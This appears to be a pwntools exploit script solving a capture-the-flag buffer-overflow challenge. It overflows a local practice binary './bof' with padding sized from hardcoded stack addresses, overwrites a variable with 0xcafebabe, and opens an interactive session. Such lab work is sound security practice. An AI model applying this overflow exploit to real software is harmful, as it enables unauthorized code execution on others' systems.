#coding=utf-8
from pwn import *

context.binary = './bof'

gets = 0x5655564f
stack = 0xffffd51c
target = 0xffffd550

r = process('./bof')
r.recvuntil('overflow me :')
r.sendline('a' * (target - stack) + p32(0xcafebabe))
r.interactive()
